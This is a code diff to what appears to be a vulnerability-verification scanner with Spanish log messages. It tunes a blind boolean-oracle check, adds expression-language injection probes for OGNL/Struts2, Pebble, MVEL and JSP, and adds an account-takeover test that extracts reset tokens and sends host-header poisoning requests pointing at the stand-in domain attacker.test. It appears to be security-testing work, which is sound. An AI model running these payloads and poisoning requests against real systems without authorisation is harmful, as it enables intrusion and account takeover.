@@ -7715,6 +7715,13 @@ def verify_generic_boolean_oracle(
                                headers=hdrs, timeout=15.0)
             return r.status_code, (r.content or b"").decode("utf-8", "replace")
 
+        # Baseline: two requests with the TRUE condition to measure natural jitter
+        step("Paso 0: baseline jitter — dos peticiones TRUE para medir varianza natural")
+        _, b_base1 = _get(true_param, true_value)
+        _, b_base2 = _get(true_param, true_value)
+        _baseline_jitter = abs(len(b_base1) - len(b_base2))
+        step(f"  baseline jitter: {_baseline_jitter}B entre las dos peticiones identicas")
+
         step(f"Paso 1: condición TRUE — {true_param}={true_value}")
         s_true, b_true = _get(true_param, true_value)
         step(f"  TRUE: status={s_true} bytes={len(b_true)} preview={b_true[:120]!r}")
@@ -7728,12 +7735,15 @@ def verify_generic_boolean_oracle(
             "base_url": base_url, "contenedor": container,
             "true_status": s_true, "false_status": s_false,
             "true_bytes": len(b_true), "false_bytes": len(b_false),
+            "baseline_jitter_bytes": _baseline_jitter,
             "true_body_recorte": b_true[:300], "false_body_recorte": b_false[:300],
         })
 
         byte_diff = abs(len(b_true) - len(b_false))
         field_only_in_true = confirm_field and confirm_field in b_true and confirm_field not in b_false
-        confirmed = (s_true == 200 and byte_diff > 20) and (field_only_in_true or byte_diff > 100)
+        # Must exceed baseline jitter by at least 2× to avoid natural variance FP
+        _byte_diff_significant = byte_diff > max(100, _baseline_jitter * 2 + 20)
+        confirmed = (s_true == 200 and byte_diff > 20) and (field_only_in_true or _byte_diff_significant)
 
         if confirmed:
             res.verified = True
@@ -11499,6 +11509,16 @@ def verify_generic_expression_language_injection(
         f"#set($x = {_a} + {_b})${{x}}",
         f"#set($y = {_a})#set($z = {_b})#set($r = $y + $z)${{r}}",
         f"{_a}+{_b}",
+        # OGNL / Apache Struts2
+        f"%{{{_a}+{_b}}}",
+        f"%{{(#context['com.opensymphony.xwork2.ActionContext.application'])[{_a}+{_b}]}}",
+        f"%{{@java.lang.Math@abs({_a})+@java.lang.Math@abs({_b})}}",
+        # Pebble template engine (Java)
+        f"{{% set x = {_a} + {_b} %}}{{{{ x }}}}",
+        # MVEL expression language
+        f"({_a} + {_b})",
+        # JSP/JSTL expression
+        f"${{param.x + {_b}}}",
     ]
     # Extended variants from payload_kb
     try:
@@ -11889,6 +11909,47 @@ def verify_generic_account_takeover(
                 step(f"  token de reset expuesto en respuesta: {_leaked_tokens[:2]} (IDOR potencial)")
                 res.evidence["leaked_reset_tokens"] = _leaked_tokens[:5]
                 _token_candidates = list(_leaked_tokens[:5]) + _token_candidates
+
+            # Extract token from Location header (some apps redirect to /reset?token=...)
+            _loc_hdr = r_reset.headers.get("Location", "")
+            if _loc_hdr:
+                _loc_tokens = re.findall(
+                    r'[?&](?:token|reset_token|code|key)=([a-fA-F0-9\-]{6,64})', _loc_hdr)
+                if _loc_tokens:
+                    step(f"  token extraído de Location header: {_loc_tokens[:2]}")
+                    _token_candidates = list(_loc_tokens[:3]) + _token_candidates
+
+            # Phase: host-header poison — inject attacker domain in reset trigger
+            # If the app generates reset links using the Host header without validation,
+            # the link will contain attacker.test and the attacker intercepts it.
+            _POISON_HEADERS = [
+                {"Host": "attacker.test"},
+                {"X-Forwarded-Host": "attacker.test"},
+                {"X-Host": "attacker.test"},
+                {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "attacker.test"},
+            ]
+            for _ph in _POISON_HEADERS:
+                try:
+                    r_p = _rq.request(http_method.upper(), boot.base_url + endpoint,
+                                      data=_params, headers=_ph, timeout=15)
+                    _pbody = r_p.text or ""
+                    _ploc  = r_p.headers.get("Location", "")
+                    if "attacker.test" in _pbody or "attacker.test" in _ploc:
+                        res.verified = True
+                        res.ok = True
+                        res.evidence.update({
+                            "endpoint": endpoint,
+                            "attack_vector": "host_header_poison",
+                            "poison_header": _ph,
+                            "attacker_domain_reflected": True,
+                            "respuesta_cuerpo_recorte": _pbody[:400],
+                            "location_header": _ploc,
+                        })
+                        step(f"VERIFICADO — account takeover via host-header poison: "
+                             f"{list(_ph.keys())[0]} → attacker.test reflejado en reset link")
+                        return res
+                except Exception:
+                    pass
 
             # Try predictable tokens
             if login_endpoint:
